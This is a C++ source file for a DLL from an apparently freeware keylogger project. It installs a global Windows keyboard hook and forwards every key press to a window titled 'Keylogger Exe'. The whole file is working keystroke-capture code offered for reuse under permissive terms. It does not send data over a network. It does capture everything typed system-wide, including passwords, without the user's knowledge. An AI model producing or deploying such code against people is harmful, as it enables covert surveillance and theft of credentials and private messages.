// keydll3.cpp : Defines the entry point for the DLL application.
//
//	Disclaimer
//	----------
//	THIS SOFTWARE AND THE ACCOMPANYING FILES ARE DISTRIBUTED "AS IS" AND WITHOUT
//	ANY WARRANTIES WHETHER EXPRESSED OR IMPLIED. NO REPONSIBILITIES FOR POSSIBLE
//	DAMAGES OR EVEN FUNCTIONALITY CAN BE TAKEN. THE USER MUST ASSUME THE ENTIRE
//	RISK OF USING THIS SOFTWARE.
//
//	Terms of use
//	------------
//	THIS SOFTWARE IS FREE FOR PERSONAL USE OR FREEWARE APPLICATIONS.
//	IF YOU USE THIS SOFTWARE IN COMMERCIAL OR SHAREWARE APPLICATIONS YOU
//	ARE GENTLY ASKED TO SEND ONE LICENCED COPY OF YOUR APPLICATION(S)
//	TO THE AUTHOR. IF YOU WANT TO PAY SOME MONEY INSTEAD, CONTACT ME BY
//	EMAIL. YOU ARE REQUESTED TO CONTACT ME BEFORE USING THIS SOFTWARE
//	IN YOUR SHAREWARE/COMMERCIAL APPLICATION.
//
//	Contact info:
//	Site: http://bizkerala.hypermart.net
//	Email: anoopt@gmx.net
//----------------------------------------------------------------------------------
//
//	Usage Instructions: See Readme.txt for Both 'Keyexe' & 'Keydll3' projects.
//
//----------------------------------------------------------------------------------
#include "stdafx.h"
#include "keydll3.h"

#pragma data_seg(".HOOKDATA")//Shared data among all instances.
HHOOK hook = NULL;
HWND hwnd = NULL;
#pragma data_seg()

#pragma comment(linker, "/SECTION:.HOOKDATA,RWS")//linker directive

HINSTANCE hinstance = NULL;

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
    }

	hinstance = (HINSTANCE)hModule;
	hook = NULL;

    return TRUE;
}


KEYDLL3_API void installhook(HWND h)
{
	hook = NULL;
	hwnd = h;
	hook = SetWindowsHookEx(WH_KEYBOARD,hookproc,hinstance,NULL);
	if(hook==NULL)
		MessageBox(NULL,"Unable to install hook","Error!",MB_OK);
}

KEYDLL3_API void removehook()
{
	UnhookWindowsHookEx(hook);
}

KEYDLL3_API LRESULT CALLBACK hookproc(int ncode,WPARAM wparam,LPARAM lparam)
{
	if(ncode>=0)
	{
		if((lparam & 0x80000000) == 0x00000000)//Check whether key was pressed(not released).
		{
			hwnd = FindWindow("#32770","Keylogger Exe");//Find application window handle
			PostMessage(hwnd,WM_USER+755,wparam,lparam);//Send info to app Window.
		}
	}
	return ( CallNextHookEx(hook,ncode,wparam,lparam) );//pass control to next hook in the hook chain.
}
